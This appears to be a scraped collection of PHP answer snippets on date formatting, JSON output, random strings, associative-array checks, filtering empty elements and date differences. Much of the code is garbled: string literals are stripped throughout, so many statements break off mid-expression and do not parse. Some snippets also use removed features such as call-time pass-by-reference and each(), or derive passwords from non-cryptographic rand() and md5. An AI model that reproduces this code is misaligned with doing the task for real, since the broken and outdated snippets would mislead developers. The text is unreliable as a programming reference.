$today = date("F j, Y, g:i a"); $today = date("m.d.y"); $today = date("j, n, Y"); $today = date("Ymd"); $today = date( $today = date( $today = date("D M j G:i:s T Y"); $today = date( $today = date("H:i:s"); $today = date("Y-m-d H:i:s");
string date ( string $format [, int $timestamp = time() ] )
$today = date("F j, Y, g:i a"); $today = date("m.d.y"); $today = date("j, n, Y"); $today = date("Ymd"); $today = date( $today = date( $today = date("D M j G:i:s T Y"); $today = date( $today = date("H:i:s"); $today = date("Y-m-d H:i:s");
<?php $today = date("F j, Y, g:i a"); $today = date("m.d.y"); $today = date("j, n, Y"); $today = date("Ymd"); $today = date( $today = date( $today = date("D M j G:i:s T Y"); $today = date( $today = date("H:i:s"); $today = date("Y-m-d H:i:s"); ?>
$tomorrow = mktime(0, 0, 0, date("m") , date("d")+1, date("Y")); $lastmonth = mktime(0, 0, 0, date("m")-1, date("d"), date("Y")); $nextyear = mktime(0, 0, 0, date("m"), date("d"), date("Y")+1); date_default_timezone_set("Asia/Calcutta"); echo date("Y/m/d H:i:s");
date_default_timezone_set( echo("<p class= echo("<p class=
<?php echo "Today is " . date("Y/m/d") . "<br>"; echo "Today is " . date("Y.m.d") . "<br>"; echo "Today is " . date("Y-m-d") . "<br>"; echo "Today is " . date("l"); ?>
<?php $currentDateTime = date( echo $currentDateTime; ?>
date_default_timezone_set("America/Chicago"); $TIME = date(
date_default_timezone_set( echo date("l"); echo date( echo "July 1, 2016 is on a " . date("l", mktime(0, 0, 0, 7, 1, 2016)); echo date(DATE_RFC2822); echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000));
$date = new DateTime(); $date->setTimeZone(new DateTimeZone("Asia/Dhaka")); $get_datetime = $date->format(
<?php date_default_timezone_set("America/New_York"); echo "The time is " . date("h:i:sa"); ?>
<?php $d=mktime(11, 14, 54, 8, 12, 2014); echo "Created date is " . date("Y-m-d h:i:sa", $d); ?>
<?php echo "Today is " . date("Y/m/d") . ; echo "Today is " . date("Y.m.d") . ; echo "Today is " . date("Y-m-d") . ; echo "Today is " . date("l"); ?>
$day=date("d"); $month=date("m"); $year=date("y"); print "date".$day."-".$month."-".$year;
We can use date function and set default timezone. <?php date_default_timezone_set("Asia/Kolkata"); echo "Today is " . date("Y/m/d") . "<br>"; echo "Today is " . date("Y.m.d") . "<br>"; echo "Today is " . date("Y-m-d") . "<br>"; echo "Today is " . date("l"); echo "The time is " . date("h:i:sa"); ?>
$s = "dollars"; echo echo "This costs a lot of $s.";
echo "Start with a simple string"; echo "String echo "String with a php variable {$name}";
<?php $fname = "David"; echo echo "My name is $fname."; echo "My name is {$fname}."; echo $foo = <<<abc My name is {$fname} abc; echo <<< My name is "$name". Now, I am printing some abc; ?>
$str = <<<EOD Example of string spanning multiple lines using heredoc syntax. EOD;
$name = $singleQuote = echo $singleQuote; $singleQuote = "This is example for single quote $name"; echo $singleQuote; Also inside single quote expression evaluate faster campare to double quotes
<?PHP $data = /** whatever you header( echo json_encode($data);
$option = $_GET[ if ( $option == 1 ) { $data = [ } else { $data = [ } header( echo json_encode( $data );
<?php header("Content-Type: application/json"); $json = json_encode($data); if ($json === false) { $json = json_encode(array("jsonError", json_last_error_msg())); if ($json === false) { $json = } http_response_code(500); } echo $json; ?>
<?php header( header( $response = array(); $response[0] = array( ); echo json_encode($response); ?>
<?php header("Content-type: text/json"); $myObj=new \stdClass(); $myObj->user_id = rand(0, 10); $myObj->male = rand(0, 5); $myObj->female = rand(0, 5); $myJSON = json_encode($myObj); echo $myJSON; ?>
<?php include( $Json = new json( $Json = new json( $Json = new json(); $object = new stdClass(); $object->test = $arraytest = array( $jsonOnly = $Json->add( $Json->add( $Json->add( $Json->add("An_Array",$arraytest); $Json->add("A_Json",$jsonOnly); $Json->send(); ?>
<?php $db = mysqli_connect("localhost","root","","mylogs"); $query = "SELECT * FROM logs LIMIT 20"; $result = mysqli_query($db, $query); $rows = array(); while($row = $result->fetch_array()){ $rows[] = $row; } $qryResult = array(); $qryResult[ echo json_encode($qryResult); mysqli_close($db); ?>
<?php ... $userCollection = [$user1, $user2, $user3]; $data = Marshal::serializeCollectionCallable(function (User $user) { return [ ]; }, $userCollection); header( echo json_encode($data);
<?php function RandomString() { $characters = $randstring = for ($i = 0; $i < 10; $i++) { $randstring = $characters[rand(0, strlen($characters))]; } return $randstring; } RandomString(); echo $randstring;
function generateRandomString($length = 10) { $characters = $charactersLength = strlen($characters); $randomString = for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; }
function generateRandomString($length = 10) { return substr(str_shuffle(str_repeat($x= } echo generateRandomString();
/** * Generate a random string, using a cryptographically secure * pseudorandom number generator (random_int) * * For PHP 7, random_int is a PHP core function * For PHP 5.x, depends on https: * * @param int $length How many characters do we want? * @param string $keyspace A string of all possible characters * to select from * @return string */ function random_str($length, $keyspace = { $pieces = []; $max = mb_strlen($keyspace, for ($i = 0; $i < $length; ++$i) { $pieces []= $keyspace[random_int(0, $max)]; } return implode( }
$string = bin2hex(openssl_random_pseudo_bytes(10));
$string = base64_encode(random_bytes(10)); $string = substr(str_replace([ $string = bin2hex(random_bytes(10));
<?php $random = substr(md5(mt_rand()), 0, 7); echo $random; ?>
$string = base64_encode(openssl_random_pseudo_bytes(30));
$chrList = $chrRepeatMin = 1; $chrRepeatMax = 10; $chrRandomLength = 10; echo substr(str_shuffle(str_repeat($chrList, mt_rand($chrRepeatMin,$chrRepeatMax))),1,$chrRandomLength);
function RandomString($length) { $keys = array_merge(range(0,9), range( $key = ""; for($i=0; $i < $length; $i++) { $key .= $keys[mt_rand(0, count($keys) - 1)]; } return $key; } echo RandomString(20);
function generateRandomString($length = 15) { return substr(sha1(rand()), 0, $length); }
$randstring .= $characters[rand(0, strlen($characters))];
$alphanum = $special = $alphabet = $alphanum . $special;
$len = 12; $random = openssl_random_pseudo_bytes($len);
$alphabet_length = strlen($alphabet); $password = for ($i = 0; $i < $len; ++$i) { $password .= $alphabet[ord($random[$i]) % $alphabet_length]; }
use SecurityLib\Strength; $factory = new RandomLib\Factory; $generator = $factory->getGenerator(new Strength(Strength::MEDIUM)); $password = $generator->generateString(12, $alphabet);
<?php echo $my_rand_strng = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), -15); echo substr(md5(rand()), 0, 7); echo str_shuffle(MD5(microtime())); ?>
2.5 $s = substr(str_shuffle(str_repeat($x= 1.9 $s = base64_encode(openssl_random_pseudo_bytes(24)); 1.68 $s = bin2hex(openssl_random_pseudo_bytes(16)); 0.63 $s = base64_encode(random_bytes(24)); 0.62 $s = bin2hex(random_bytes(16)); 0.37 $s = substr(md5(rand()), 0, 32); 0.37 $s = substr(md5(mt_rand()), 0, 32);
function rndStr($len = 64) { $randomData = file_get_contents( $str = substr(str_replace(array( return $str; }
/** Get a random string * @return string 32 hexadecimal characters */ function rand_string() { return md5(uniqid(mt_rand(), true)); }
/** * Generate a "random" alpha-numeric string. * * Should not be considered sufficient for cryptography, etc. * * @param int $length * @return string */ function str_random($length = 16) { $pool = return substr(str_shuffle(str_repeat($pool, $length)), 0, $length); }
$characters = ’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;
function random_string($length){ return substr(str_repeat(md5(rand()), ceil($length/32)), 0, $length); }
/** * @param int $length * @param string $abc * @return string */ function generateRandomString($length = 10, $abc = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") { return substr(str_shuffle($abc), 0, $length); }
function rndStr($len = 20) { $rnd= for($i=0;$i<$len;$i++) { do { $byte = openssl_random_pseudo_bytes(1); $asc = chr(base_convert(substr(bin2hex($byte),0,2),16,10)); } while(!ctype_alnum($asc)); $rnd .= $asc; } return $rnd; }
function randomString($length = 5) { return substr(str_shuffle(implode(array_merge(range( }
function RandomString($length) { $original_string = array_merge(range(0,9), range( $original_string = implode("", $original_string); return substr(str_shuffle($original_string), 0, $length); } echo RandomString(6);
<?php function RandomString() { global $randstring ; $characters = $randstring = for ($i = 0; $i < 10; $i++) { $randstring .= $characters[rand(0, strlen($characters))]; } return $randstring; } RandomString(); echo $randstring; ?>
<?php function RandomString() { global $randstring ; $characters = str_split( array_filter ($characters,function($var)use($characters,&$randstring){ $randstring .= $characters[rand(0, count($characters)-1)]; }); return $randstring; } RandomString();echo $randstring. $randstring= ?>
<?php function s($length){ for($i=0;($i<$length)and(($what=rand(1,3))and( (($what==1)and($t=rand(48,57) ))or (($what==2)and ($t=rand(65,90))) or (($what==3)and ($t=rand(97,122))) ) and (print chr($t)));$i++); } s(10); ?>
<?php /** * Creates a random string * * @param (int) $length * Length in characters * @param (array) $ranges * (optional) Array of ranges to be used * * @return * Random string */ function random_string($length, $ranges = array( foreach ($ranges as $r) $s .= implode(range(array_shift($r = explode( while (strlen($s) < $length) $s .= $s; return substr(str_shuffle($s), 0, $length); } $l = 100; echo echo echo echo
function getRandomString($length) { $salt = array_merge(range( $maxIndex = count($salt) - 1; $result = for ($i = 0; $i < $length; $i++) { $index = mt_rand(0, $maxIndex); $result .= $salt[$index]; } return $result }
$Length = 10; $RandomString = substr(str_shuffle(md5(time())), 0, $Length); echo $RandomString;
function cvf_ps_generate_random_code($length=10) { $string = $characters = "23456789ABCDEFHJKLMNPRTVWXYZabcdefghijklmnopqrstuvwxyz"; for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; }
function isAssoc(array $arr) { if (array() === $arr) return false; return array_keys($arr) !== range(0, count($arr) - 1); } var_dump(isAssoc(array( var_dump(isAssoc(array("0" => var_dump(isAssoc(array("1" => var_dump(isAssoc(array("a" =>
function has_string_keys(array $array) { return count(array_filter(array_keys($array), }
<?php $arr = array(1,2,3,4); $isIndexed = array_values($arr) === $arr;
function keyedNext( &$arr, &$k){ $k = key($arr); return next($arr); } for ($k = key(reset($my_array)); is_int($k); keyedNext($my_array,$k)) $onlyIntKeys = is_null($k);
/*! \param[in] $InputArray (array) Input array. \return (bool) \b true iff the input is an array whose keys are all integers. */ function IsArrayAllKeyInt($InputArray) { if(!is_array($InputArray)) { return false; } if(count($InputArray) <= 0) { return true; } return array_unique(array_map("is_int", array_keys($InputArray))) === array(true); }
/*! \param[in] $InputArray (array) Input array. \return (bool) \b true iff the input is an array whose keys are all strings. */ function IsArrayAllKeyString($InputArray) { if(!is_array($InputArray)) { return false; } if(count($InputArray) <= 0) { return true; } return array_unique(array_map("is_string", array_keys($InputArray))) === array(true); }
/*! \param[in] $InputArray (array) Input array. \return (bool) \b true iff the input is an array with at least one key being an integer and at least one key being a string. */ function IsArraySomeKeyIntAndSomeKeyString($InputArray) { if(!is_array($InputArray)) { return false; } if(count($InputArray) <= 0) { return true; } return count(array_unique(array_map("is_string", array_keys($InputArray)))) >= 2; }
/*! \param[in] $InputArray (array) Input array. \return (bool) \b true iff the input is an array whose keys are numeric, sequential, and zero-based. */ function IsArrayKeyNumericSequentialZeroBased($InputArray) { if(!is_array($InputArray)) { return false; } if(count($InputArray) <= 0) { return true; } return array_keys($InputArray) === range(0, count($InputArray) - 1); }
array(0 => "b"); array(13 => "b"); array(-13 => "b"); array(0x1A => "b");
array("fish and chips" => "b"); array("" => "b"); array("stackoverflow_email@example.com" => "b"); array("stack\t\"over\"\r\nflow array( array("functіon" => "b"); array("ま말轉转ДŁ" => "b"); array("fi\x0sh" => "b"); array(file_get_contents("https:
array("13." => "b"); array("+13" => "b"); array("-013" => "b"); array("0x1A" => "b"); array("013" => "b"); array("18446744073709551616" => "b");
function isAssoc($array) { return ($array !== array_values($array)); }
function isAssoc($array) { $array = array_keys($array); return ($array !== array_keys($array)); }
function checkAssoc($array){ return ctype_digit( implode( }
function is_assoc($array){ $keys = array_keys($array); return $keys !== array_keys($keys); }
function array_type( $obj ){ $last_key = -1; $type = foreach( $obj as $key => $val ){ if( !is_int( $key ) || $key < 0 ){ return } if( $key !== $last_key + 1 ){ $type = } $last_key = $key; } return $type; }
function is_indexed_array(&$arr) { for (reset($arr); is_int(key($arr)); next($arr)); return is_null(key($arr)); } function is_sequential_array(&$arr, $base = 0) { for (reset($arr), $base = (int) $base; key($arr) === $base++; next($arr)); return is_null(key($arr)); }
function is_asso($a){ foreach(array_keys($a) as $key) {if (!is_int($key)) return TRUE;} return FALSE; }
$arrays = Array( ); function is_indexed_array_1(Array &$arr) { return $arr === array_values($arr); } function is_indexed_array_2(Array &$arr) { for (reset($arr), $i = 0; key($arr) === $i++; next($arr)) ; return is_null(key($arr)); } $start = microtime(true); for ($i = 0; $i < 1000; $i++) { foreach ($arrays as $array) { $dummy = is_indexed_array_1($array); } } $end = microtime(true); echo "Time taken with method $start = microtime(true); for ($i = 0; $i < 1000; $i++) { foreach ($arrays as $array) { $dummy = is_indexed_array_2($array); } } $end = microtime(true); echo "Time taken with method
/** * Determines if an array is associative. * * An array is "associative" if it doesn * * @param array $array * @return bool */ public static function isAssoc(array $array) { $keys = array_keys($array); return array_keys($keys) !== $keys; }
function array_is_assoc(array $a) { $i = 0; foreach ($a as $k => $v) { if ($k !== $i++) { return true; } } return false; }
function is_assoc($arr) { ksort($arr); return json_encode($arr)[0] === }
function isAssociative(array $array) { return array_keys(array_merge($array)) !== range(0, count($array) - 1); }
function is_associative ( $a ) { return in_array(false, array_map( } assert( true === is_associative(array(1, 2, 3, 4)) ); assert( false === is_associative(array( assert( false === is_associative(array(1, 2, 3,
$a = array( 1, 2, 3, 4 ); unset($a[1]); assert( true === is_associative($a) );
<?php function is_list($array) { return array_keys($array) === range(0, count($array) - 1); } function is_assoc($array) { return count(array_filter(array_keys($array), } ?>
function array_has_numeric_keys_only(array $array) { try { SplFixedArray::fromArray($array, true); } catch (InvalidArgumentException $e) { return false; } return true; }
<?php /** * Since PHP stores all arrays as associative internally, there is no proper * definition of a scalar array. * * As such, developers are likely to have varying definitions of scalar array, * based on their application needs. * * In this file, I present 3 increasingly strict methods of determining if an * array is scalar. * * @author David Farrell <DavidPFarrell@gmail.com> */ /** * isArrayWithOnlyIntKeys defines a scalar array as containing * only integer keys. * * If you are explicitly setting integer keys on an array, you * may need this function to determine scalar-ness. * * @param array $a * @return boolean */ function isArrayWithOnlyIntKeys(array $a) { if (!is_array($a)) return false; foreach ($a as $k => $v) if (!is_int($k)) return false; return true; } /** * isArrayWithOnlyAscendingIntKeys defines a scalar array as * containing only integer keys in ascending (but not necessarily * sequential) order. * * If you are performing pushes, pops, and unsets on your array, * you may need this function to determine scalar-ness. * * @param array $a * @return boolean */ function isArrayWithOnlyAscendingIntKeys(array $a) { if (!is_array($a)) return false; $prev = null; foreach ($a as $k => $v) { if (!is_int($k) || (null !== $prev && $k <= $prev)) return false; $prev = $k; } return true; } /** * isArrayWithOnlyZeroBasedSequentialIntKeys defines a scalar array * as containing only integer keys in sequential, ascending order, * starting from 0. * * If you are only performing operations on your array that are * guaranteed to either maintain consistent key values, or that * re-base the keys for consistency, then you can use this function. * * @param array $a * @return boolean */ function isArrayWithOnlyZeroBasedSequentialIntKeys(array $a) { if (!is_array($a)) return false; $i = 0; foreach ($a as $k => $v) if ($i++ !== $k) return false; return true; }
function isNumericArray($array) { $count = count($array); for ($i = 0; $i < $count; $i++) { if (!isset($array[$i])) { return FALSE; } } return TRUE; }
public static function isArrayAssociative(array $array) { reset($array); return !is_int(key($array)); }
function isSequential($value){ if(is_array($value) || ($value instanceof \Countable && $value instanceof \ArrayAccess)){ for ($i = count($value) - 1; $i >= 0; $i--) { if (!isset($value[$i]) && !array_key_exists($i, $value)) { return false; } } return true; } else { throw new \InvalidArgumentException( sprintf( ); } }
<?php function method_1(Array &$arr) { return $arr === array_values($arr); } function method_2(Array &$arr) { for (reset($arr), $i = 0; key($arr) !== $i++; next($arr)); return is_null(key($arr)); } function method_3(Array &$arr) { return array_keys($arr) === range(0, count($arr) - 1); } function method_4(Array &$arr) { $idx = 0; foreach( $arr as $key => $val ){ if( $key !== $idx ) return FALSE; $idx++; } return TRUE; } function benchmark(Array $methods, Array &$target){ foreach($methods as $method){ $start = microtime(true); for ($i = 0; $i < 1000; $i++) $dummy = call_user_func($method, $target); $end = microtime(true); echo "Time taken with $method = ".round(($end-$start)*1000.0,3)."ms\n"; } } $targets = [ ]; $methods = [ ]; foreach($targets as $targetName => $target){ echo "==== Benchmark using $targetName ====\n"; benchmark($methods, $target); echo "\n"; }
==== Benchmark using Huge array ==== Time taken with method_1 = 5504.632ms Time taken with method_2 = 4509.445ms Time taken with method_3 = 8614.883ms Time taken with method_4 = 2720.934ms ==== Benchmark using Small array ==== Time taken with method_1 = 77.159ms Time taken with method_2 = 130.03ms Time taken with method_3 = 160.866ms Time taken with method_4 = 69.946ms
/** * Tests if an array is an associative array. * * @param array $array An array to test. * @return boolean True if the array is associative, otherwise false. */ function is_assoc(array &$arr) { if (FALSE === is_array($arr) || 0 === ($l = count($arr))) { return false; } reset($arr); if (key($arr) !== 0) { return true; } end($arr); if (key($arr) !== $l-1) { return true; } return array_values($arr) !== $arr; }
<?php function method_1(Array &$arr) { return $arr === array_values($arr); } function method_3(Array &$arr) { return array_keys($arr) === range(0, count($arr) - 1); } function method_4(Array &$arr) { $idx = 0; foreach( $arr as $key => $val ){ if( $key !== $idx ) return FALSE; ++$idx; } return TRUE; } function method_5(Array &$arr) { global $METHOD_5_KEY; $i = 0; $l = count($arr)-1; end($arr); if ( key($arr) !== $l ) return FALSE; reset($arr); do { if ( $i !== key($arr) ) return FALSE; ++$i; next($arr); } while ($i < $l); return TRUE; } function method_6(Array &$arr) { $i = 0; $l = count($arr); do { if ( NULL === @$arr[$i] ) return FALSE; ++$i; } while ($i < $l); return TRUE; } function method_7(Array &$arr) { return array_keys(array_values($arr)) === array_keys($arr); } function method_8(Array &$arr) { reset($arr); if ( key($arr) !== 0 ) return FALSE; end($arr); if ( key($arr) !== count($arr)-1 ) return FALSE; return array_values($arr) === $arr; } function benchmark(Array &$methods, Array &$target, $expected){ foreach($methods as $method){ $start = microtime(true); for ($i = 0; $i < 2000; ++$i) { if ( $method($target) !== $expected ) { echo "Method $method is disqualified for returning an incorrect result.\n"; unset($methods[array_search($method,$methods,true)]); $i = 0; break; } } if ( $i != 0 ) { $end = microtime(true); echo "Time taken with $method = ".round(($end-$start)*1000.0,3)."ms\n"; } } } $true_targets = [ ]; $g = range(0,10); unset($g[0]); $false_targets = [ ]; $methods = [ ]; foreach($false_targets as $targetName => $target){ echo "==== Benchmark using $targetName expecing FALSE ====\n"; benchmark($methods, $target, false); echo "\n"; } foreach($true_targets as $targetName => $target){ echo "==== Benchmark using $targetName expecting TRUE ====\n"; benchmark($methods, $target, true); echo "\n"; }
for i in 0 to len(your_array): if not defined(your-array[i]):
function isHash($array) { if (!is_array($array)) return false; $diff = array_diff_assoc($array, array_values($array)); return (empty($diff)) ? false : true; }
<?php function isSubset($a, $b) { foreach($a =>$v) if(array_search($v, $b) === false) return false; return true; } function isAssoc($arr) { return !isSubset(array_keys($arr), range(0, count($arr) - 1)); } var_dump(isAssoc(array( var_dump(isAssoc(array(1 => var_dump(isAssoc(array("0" => var_dump(isAssoc(array("a" => ?>
count() = 7 , max = 5, min=-1 if( 7 == (5-(-1)+1 ) return false; /** * isAssoc Checks if an array is associative * @param $arr reference to the array to be checked * @return bool */ function IsAssoc(&$arr){ $keys= array_keys($arr); foreach($keys as $key){ if (!is_integer($key)) return true; } if(count($arr) == (max($keys)-min($keys)+1)) return false; else return true; }
$arr1 = array(false); $arr2 = array(); var_dump(reset($arr1) === reset($arr2));
$array = []; for($i=0; $i < 100; $i++) $array["key$i"] = $i; for($i=0, $start = microtime(true); $i < 1000000; $i++) { foreach ($array as $firstKey => $firstValue) { break; } } echo "foreach to get first key and value: " . (microtime(true) - $start) . " seconds <br />"; for($i=0, $start = microtime(true); $i < 1000000; $i++) { $firstValue = reset($array); $firstKey = key($array); } echo "reset+key to get first key and value: " . (microtime(true) - $start) . " seconds <br />"; for($i=0, $start = microtime(true); $i < 1000000; $i++) { reset($array); $firstKey = key($array); } echo "reset+key to get first key: " . (microtime(true) - $start) . " seconds <br />"; for($i=0, $start = microtime(true); $i < 1000000; $i++) { $firstKey = array_keys($array)[0]; } echo "array_keys to get first key: " . (microtime(true) - $start) . " seconds <br />";
foreach to get first key and value: 0.15501809120178 seconds reset+key to get first key and value: 0.29375791549683 seconds reset+key to get first key: 0.26421809196472 seconds array_keys to get first key: 10.059751987457 seconds
$arr = ["my" => "test", "is" => "best"]; echo array_keys($arr)[0] . "\r\n"; $arr = ["test", "best"]; echo array_keys($arr)[0] . "\r\n"; $arr = [1 => "test", 2 => "best"]; echo array_keys($arr)[0] . "\r\n";
$myArray = array( 2 => 4 => 1 => 3 => ); echo min(array_keys($myArray));
$yourArray = array( $keys = array_keys($yourArray); echo "Key = ".$keys[0];
$arr = array( list($first_key) = each($arr); print $first_key;
$firstKey = array_keys(array_slice($array, 0, 1, TRUE))[0];
foreach to get first key and value: 0.048566102981567 seconds reset+key to get first key and value: 0.11727809906006 seconds reset+key to get first key: 0.11707186698914 seconds array_keys to get first key: 0.53917098045349 seconds array_slice to get first key: 0.2494580745697 seconds
foreach to get first key and value: 0.048488140106201 seconds reset+key to get first key and value: 0.12659382820129 seconds reset+key to get first key: 0.12248802185059 seconds array_slice to get first key: 0.25442600250244 seconds
$array = [ array_key_first($array); array_key_last($array);
$array = array( echo key( array_slice( $array, 0, 1, true ) );
$data = $request->request->all(); dump($data); while ($test = current($data)) { dump($test); echo key($data). break; }
$daysArray = array( $day = current($transport); $day = next($transport); $day = current($transport); $day = prev($transport); $day = end($transport); $day = current($transport);
foreach($linksArray as $link) { if($link == { unset($link); } } print_r($linksArray);
print_r(array_filter($linksArray, create_function( print_r(array_filter($linksArray, function($value) { return $value !==
$emptyRemoved = remove_empty($linksArray); function remove_empty($array) { return array_filter($array, } function _remove_empty_internal($value) { return !empty($value) || $value === 0; }
<?php $arr = array( print_r(array_filter($arr)); print_r(array_filter($arr,
$myarray = array_filter($myarray, $myarray = array_filter($myarray);
$a = array(0, var_dump(array_filter($a)); var_dump(array_diff($a, array(0))) var_dump(array_diff($a, array(NULL)))
foreach($linksArray as $key => $link) { if($link === { unset($linksArray[$key]); } } print_r($linksArray);
$myarray = array("\r", "\n", "\r\n", "", " ", "0", "a"); $new1 = array_filter($myarray); $new2 = array_filter(array_map( $new3 = array_filter(array_map( $new4 = array_values(array_filter(array_map( var_dump($new1, $new2, $new3, $new4);
array(5) { [0]=> " string(1) " [1]=> string(1) " " [2]=> string(2) " " [4]=> string(1) " " [6]=> string(1) "a" } array(1) { [6]=> string(1) "a" } array(2) { [5]=> string(1) "0" [6]=> string(1) "a" } array(2) { [0]=> string(1) "0" [1]=> string(1) "a" }
$filtered = array_diff($originalArray, function myCallback($var) { return $var === false; }
$filtered = array_filter($originalArray, function myCallback($var) { return ($var === 0 || $var === }
$a = array(1, $b = array_values(array_filter($a)); print_r($b)
for ($i=0; $i<$count($Array); $i++) { if (empty($Array[$i])) unset($Array[$i]); }
$url = array_filter($data, function ($value) { return (!empty($value) || $value === 0 || $value=== });
$out_array = array_filter($input_array, function($item) { return !empty($item[ } );
function trim_array($Array) { foreach ($Array as $value) { if(trim($value) === $index = array_search($value, $Array); unset($Array[$index]); } } return $Array; }
foreach($arr as $key => $val){ if (empty($val)) unset($arr[$key]; }
$linksArray = array_filter($linksArray); print_r($linksArray);
$array_without_empty_values = array_filter($array);
$my = ("0"=>" ","1"=>"5","2"=>"6","3"=>" "); foreach ($my as $key => $value) { if (is_null($value)) unset($my[$key]); } foreach ($my as $key => $value) { echo $key . }
function removeEmptyElements(&$element) { if (is_array($element)) { if ($key = key($element)) { $element[$key] = array_filter($element); } if (count($element) != count($element, COUNT_RECURSIVE)) { $element = array_filter(current($element), __FUNCTION__); } return $element; } else { return empty($element) ? false : $element; } } $data = array( ), ) ), ), ) ), ), ), ) ), ), ) ); $data = array_filter($data, var_dump($data);
$or = array( ); $or = array_filter($or); $condition = array( );
foreach($linksArray as $link){ if(!empty($link)){ $new_arr[] = $link } } print_r($new_arr);
$date1 = "2007-03-24"; $date2 = "2009-06-26"; $diff = abs(strtotime($date2) - strtotime($date1)); $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24)); printf("%d years, %d months, %d days\n", $years, $months, $days);
<?php /** * Calculate differences between two dates with precise semantics. Based on PHPs DateTime::diff() * implementation by Derick Rethans. Ported to PHP by Emil H, 2011-05-02. No rights reserved. * * See here for original code: * http: * http: */ function _date_range_limit($start, $end, $adj, $a, $b, $result) { if ($result[$a] < $start) { $result[$b] -= intval(($start - $result[$a] - 1) / $adj) + 1; $result[$a] += $adj * intval(($start - $result[$a] - 1) / $adj + 1); } if ($result[$a] >= $end) { $result[$b] += intval($result[$a] / $adj); $result[$a] -= $adj * intval($result[$a] / $adj); } return $result; } function _date_range_limit_days($base, $result) { $days_in_month_leap = array(31, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31); $days_in_month = array(31, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31); _date_range_limit(1, 13, 12, "m", "y", &$base); $year = $base["y"]; $month = $base["m"]; if (!$result["invert"]) { while ($result["d"] < 0) { $month--; if ($month < 1) { $month += 12; $year--; } $leapyear = $year % 400 == 0 || ($year % 100 != 0 && $year % 4 == 0); $days = $leapyear ? $days_in_month_leap[$month] : $days_in_month[$month]; $result["d"] += $days; $result["m"]--; } } else { while ($result["d"] < 0) { $leapyear = $year % 400 == 0 || ($year % 100 != 0 && $year % 4 == 0); $days = $leapyear ? $days_in_month_leap[$month] : $days_in_month[$month]; $result["d"] += $days; $result["m"]--; $month++; if ($month > 12) { $month -= 12; $year++; } } } return $result; } function _date_normalize($base, $result) { $result = _date_range_limit(0, 60, 60, "s", "i", $result); $result = _date_range_limit(0, 60, 60, "i", "h", $result); $result = _date_range_limit(0, 24, 24, "h", "d", $result); $result = _date_range_limit(0, 12, 12, "m", "y", $result); $result = _date_range_limit_days(&$base, &$result); $result = _date_range_limit(0, 12, 12, "m", "y", $result); return $result; } /** * Accepts two unix timestamps. */ function _date_diff($one, $two) { $invert = false; if ($one > $two) { list($one, $two) = array($two, $one); $invert = true; } $key = array("y", "m", "d", "h", "i", "s"); $a = array_combine($key, array_map("intval", explode(" ", date("Y m d H i s", $one)))); $b = array_combine($key, array_map("intval", explode(" ", date("Y m d H i s", $two)))); $result = array(); $result["y"] = $b["y"] - $a["y"]; $result["m"] = $b["m"] - $a["m"]; $result["d"] = $b["d"] - $a["d"]; $result["h"] = $b["h"] - $a["h"]; $result["i"] = $b["i"] - $a["i"]; $result["s"] = $b["s"] - $a["s"]; $result["invert"] = $invert ? 1 : 0; $result["days"] = intval(abs(($one - $two)/86400)); if ($invert) { _date_normalize(&$a, &$result); } else { _date_normalize(&$b, &$result); } return $result; } $date = "1986-11-10 19:37:22"; print_r(_date_diff(strtotime($date), time())); print_r(_date_diff(time(), strtotime($date)));
$date1 = new DateTime("2007-03-24"); $date2 = new DateTime("2009-06-26"); $interval = $date1->diff($date2); echo "difference " . $interval->y . " years, " . $interval->m." months, ".$interval->d." days "; echo "difference " . $interval->days . " days ";
$date1 = new DateTime("now"); $date2 = new DateTime("tomorrow"); var_dump($date1 == $date2); var_dump($date1 < $date2); var_dump($date1 > $date2);
$first_date = new DateTime("2012-11-30 17:03:30"); $second_date = new DateTime("2012-12-21 00:00:00");
object(DateInterval) public public public public public public public public
/** * Format an interval to show all existing components. * If the interval doesn * That component won * * @param DateInterval $interval The interval * * @return string Formatted interval string. */ function format_interval(DateInterval $interval) { $result = ""; if ($interval->y) { $result .= $interval->format("%y years "); } if ($interval->m) { $result .= $interval->format("%m months "); } if ($interval->d) { $result .= $interval->format("%d days "); } if ($interval->h) { $result .= $interval->format("%h hours "); } if ($interval->i) { $result .= $interval->format("%i minutes "); } if ($interval->s) { $result .= $interval->format("%s seconds "); } return $result; }
/** * Format an interval to show all existing components. * If the interval doesn * That component won * * @param DateInterval $interval The interval * * @return string Formatted interval string. */ function format_interval(DateInterval $interval) { $result = ""; if ($interval->y) { $result .= $interval->format("%y years "); } if ($interval->m) { $result .= $interval->format("%m months "); } if ($interval->d) { $result .= $interval->format("%d days "); } if ($interval->h) { $result .= $interval->format("%h hours "); } if ($interval->i) { $result .= $interval->format("%i minutes "); } if ($interval->s) { $result .= $interval->format("%s seconds "); } return $result; } $first_date = new DateTime("2012-11-30 17:03:30"); $second_date = new DateTime("2012-12-21 00:00:00"); $difference = $first_date->diff($second_date); echo format_interval($difference);
$date1 = "2008-11-01 22:45:00"; $date2 = "2009-12-04 13:44:01"; $diff = abs(strtotime($date2) - strtotime($date1)); $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24)); $hours = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24 - $days*60*60*24)/ (60*60)); $minuts = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24 - $days*60*60*24 - $hours*60*60)/ 60); $seconds = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24 - $days*60*60*24 - $hours*60*60 - $minuts*60)); printf("%d years, %d months, %d days, %d hours, %d minuts\n, %d seconds\n", $years, $months, $days, $hours, $minuts, $seconds);
function dateDiff ($d1, $d2) { return round(abs(strtotime($d1) - strtotime($d2))/86400); }
